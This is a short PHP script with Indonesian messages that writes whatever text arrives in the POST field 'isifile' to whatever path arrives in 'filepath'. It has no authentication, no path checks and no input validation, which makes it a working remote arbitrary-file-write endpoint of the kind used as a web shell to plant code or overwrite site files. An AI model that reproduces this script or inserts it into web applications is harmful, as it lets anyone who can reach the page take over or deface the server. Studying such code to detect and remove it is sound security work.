<?php

$isifile = $_POST['isifile'];
$filepath = $_POST['filepath'];

if (is_writable($filepath)) {

    if (!$handle = fopen($filepath, 'w+')) {
         echo "Cannot open file ($filepath)";
         exit;
    }

    if (fwrite($handle, $isifile) === FALSE) {
        echo "Tidak bisa tulis di: ($filepath)";
        exit;
    }

    echo "Berhasil disimpan: ($filepath)";

    fclose($handle);

} else {
    echo "File: $filepath tidak bisa diubah!";
}